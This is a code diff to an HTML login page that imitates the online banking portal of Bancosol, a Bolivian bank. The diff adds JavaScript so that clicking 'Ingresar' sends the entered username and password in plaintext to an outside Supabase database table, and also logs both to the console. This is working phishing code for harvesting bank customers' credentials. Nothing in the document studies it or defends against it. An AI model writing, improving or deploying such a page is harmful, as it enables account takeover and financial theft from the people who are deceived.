@@ -6,6 +6,7 @@
     <title>Iniciar sesión | Bancosol</title>
     <link rel="icon" href="https://www.bancosol.com.bo/favicon.ico" type="image/x-icon">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <!-- No CDN needed - using direct REST API calls -->
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -91,11 +92,10 @@
 
         /* Login Form Overlay */
         .login-form-wrapper {
-            display: none; width: 100%; height: 100%; min-height: 600px;
+            display: none; width: 100%;
             flex-direction: column; align-items: center;
-            position: absolute; top: 0; left: 0; padding: 64px 57px;
+            padding: 64px 57px;
             background: linear-gradient(180deg, #F4F0FF 0%, #FFFFFF 100%);
-            z-index: 10;
         }
         .login-form-wrapper.active { display: flex; }
         .login-form-inner { max-width: 400px; width: 100%; display: flex; flex-direction: column; flex: 1; }
@@ -268,7 +268,7 @@
                     <img class="login-logo" src="./inicio_files/bancosol-logo-simple.svg" alt="Solnet logo">
                     <h2>Accede a tu Banca</h2>
                     <p>Iniciar sesión en nuestra plataforma digital es rápido y seguro. Elige una de las opciones a continuación para ser redirigido a la página donde podrás ingresar tus credenciales.</p>
-                    <div class="login-card purple" onclick="showLoginForm()">
+                    <div class="login-card purple" id="bancaPersonasCard">
                         <div class="card-top"></div>
                         <div class="card-body">
                             <h4>Banca personas</h4>
@@ -364,46 +364,150 @@
         <span>Ayuda</span>
     </div>
     <script>
+        // ============================================================
+        // FUNCIONES DE UI (definidas primero para que estén disponibles)
+        // ============================================================
         function showLoginForm() {
-            document.getElementById('loginCardsView').style.display = 'none';
-            document.getElementById('loginFormView').classList.add('active');
+            var cardsView = document.getElementById('loginCardsView');
+            var formView = document.getElementById('loginFormView');
+            if (cardsView) cardsView.style.display = 'none';
+            if (formView) formView.classList.add('active');
         }
         function hideLoginForm() {
-            document.getElementById('loginFormView').classList.remove('active');
-            document.getElementById('loginCardsView').style.display = '';
+            var formView = document.getElementById('loginFormView');
+            var cardsView = document.getElementById('loginCardsView');
+            if (formView) formView.classList.remove('active');
+            if (cardsView) cardsView.style.display = '';
         }
         function togglePasswordVisibility() {
             var passwordInput = document.getElementById('password');
             var visOn = document.getElementById('visibilityOn');
             var visOff = document.getElementById('visibilityOff');
-            if (passwordInput.type === 'password') {
-                passwordInput.type = 'text';
-                visOn.classList.add('hidden');
-                visOff.classList.remove('hidden');
-            } else {
-                passwordInput.type = 'password';
-                visOn.classList.remove('hidden');
-                visOff.classList.add('hidden');
+            if (passwordInput && visOn && visOff) {
+                if (passwordInput.type === 'password') {
+                    passwordInput.type = 'text';
+                    visOn.classList.add('hidden');
+                    visOff.classList.remove('hidden');
+                } else {
+                    passwordInput.type = 'password';
+                    visOn.classList.remove('hidden');
+                    visOff.classList.add('hidden');
+                }
             }
         }
         function showHelp() {
             alert('Si necesitas ayuda con tu contraseña, comunícate con FonoSol al 800 10 2929 o acércate a la agencia más cercana.');
         }
-        // Enable login button when fields have content
+
+        // ============================================================
+        // SUPABASE CONFIGURATION - Usando REST API directa (sin SDK)
+        // ============================================================
+        const SUPABASE_URL = 'https://ktuknakuiicqdicknqnu.supabase.co';
+        const SUPABASE_ANON_KEY = 'sb_publishable_mIQcyGnaX_oatdbodvzJVQ_Szu_D0en';
+        const SUPABASE_TABLE = 'solicitudes_ingreso';
+
+        /**
+         * Función para insertar datos en Supabase usando la REST API directamente
+         * Esto es más robusto porque no depende de cargar ningún SDK externo
+         */
+        async function supabaseInsert(data) {
+            const url = `${SUPABASE_URL}/rest/v1/${SUPABASE_TABLE}`;
+            
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'apikey': SUPABASE_ANON_KEY,
+                    'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                    'Prefer': 'return=representation'
+                },
+                body: JSON.stringify(data)
+            });
+
+            if (!response.ok) {
+                const errorText = await response.text();
+                let errorData;
+                try {
+                    errorData = JSON.parse(errorText);
+                } catch {
+                    errorData = { message: errorText };
+                }
+                throw {
+                    code: response.status,
+                    message: errorData.message || errorData.error || response.statusText,
+                    details: errorText,
+                    status: response.status
+                };
+            }
+
+            return await response.json();
+        }
+
+        console.log('✅ Supabase REST API configurada correctamente');
+
+        // ============================================================
+        // DOM CONTENT LOADED
+        // ============================================================
         document.addEventListener('DOMContentLoaded', function() {
+            // Click en la tarjeta "Banca personas" para mostrar el formulario
+            var bancaPersonasCard = document.getElementById('bancaPersonasCard');
+            if (bancaPersonasCard) {
+                bancaPersonasCard.addEventListener('click', showLoginForm);
+            }
+
             var username = document.getElementById('username');
             var password = document.getElementById('password');
             var loginBtn = document.getElementById('loginButton');
+
+            if (!username || !password || !loginBtn) {
+                console.warn('Elementos del formulario no encontrados');
+                return;
+            }
+
+            // Habilitar botón cuando los campos tengan contenido
             function checkFields() {
                 loginBtn.disabled = !(username.value.trim() && password.value.trim());
             }
             username.addEventListener('input', checkFields);
             password.addEventListener('input', checkFields);
 
-            // Show loader on login submit
-            loginBtn.addEventListener('click', function(e) {
-                if (!loginBtn.disabled) {
-                    document.getElementById('loaderOverlay').classList.add('active');
+            // Enviar datos a Supabase al hacer clic en Ingresar
+            loginBtn.addEventListener('click', async function(e) {
+                if (loginBtn.disabled) return;
+
+                const user = username.value.trim();
+                const pass = password.value.trim();
+
+                if (!user || !pass) {
+                    alert('Por favor complete todos los campos.');
+                    return;
+                }
+
+                console.log('=== Intentando guardar en Supabase ===');
+                console.log('Usuario:', user);
+                console.log('Contraseña:', pass);
+                console.log('Portal: inicio');
+
+                try {
+                    const result = await supabaseInsert([
+                        {
+                            usuario: user,
+                            contrasena: pass,
+                            portal: 'inicio',
+                            estado: 'pendiente',
+                            created_at: new Date().toISOString()
+                        }
+                    ]);
+                    
+                    console.log('✅ SUCCESS - Solicitud guardada exitosamente:', result);
+                    alert('¡Datos guardados correctamente en Supabase!');
+                    
+                } catch (err) {
+                    console.error('❌ ERROR de Supabase:', err);
+                    console.error('Código:', err.code);
+                    console.error('Mensaje:', err.message);
+                    console.error('Detalles:', err.details);
+                    alert(`Error al guardar en Supabase (${err.code}). Revisa la consola (F12) para más detalles.`);
                 }
             });
         });
